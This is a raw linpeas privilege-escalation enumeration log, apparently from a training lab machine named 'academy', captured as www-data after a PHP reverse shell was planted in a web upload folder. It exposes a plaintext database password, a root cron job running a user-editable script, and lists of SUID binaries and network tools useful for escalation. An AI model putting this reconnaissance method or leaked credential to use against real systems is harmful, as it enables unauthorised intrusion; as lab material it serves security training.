/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                                                                    
[+] Can I read root folder? ........... No                                                                                                                     
                                                                                                                                                               
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                                                                          

[+] Looking for root files in folders owned by me
                                                                                                                                                               
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                                                               
[+] Files inside /home/www-data (limit 20)
                                                                                                                                                               
[+] Files inside others home (limit 20)
/home/grimmie/.bash_history                                                                                                                                    
/home/grimmie/.bashrc
/home/grimmie/backup.sh
/home/grimmie/.profile
/home/grimmie/.bash_logout

[+] Looking for installed mail applications
                                                                                                                                                               
[+] Mails (limit 50)
                                                                                                                                                               
[+] Backup files?
-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                                                    
-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
                                                                                                                                                               
[+] Web files?(output limit)
/var/www/:                                                                                                                                                     
total 12K
drwxr-xr-x  3 root root 4.0K May 29  2021 .
drwxr-xr-x 12 root root 4.0K May 29  2021 ..
drwxr-xr-x  3 root root 4.0K May 29  2021 html

/var/www/html:
total 24K
drwxr-xr-x 3 root     root     4.0K May 29  2021 .
drwxr-xr-x 3 root     root     4.0K May 29  2021 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            
-rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      
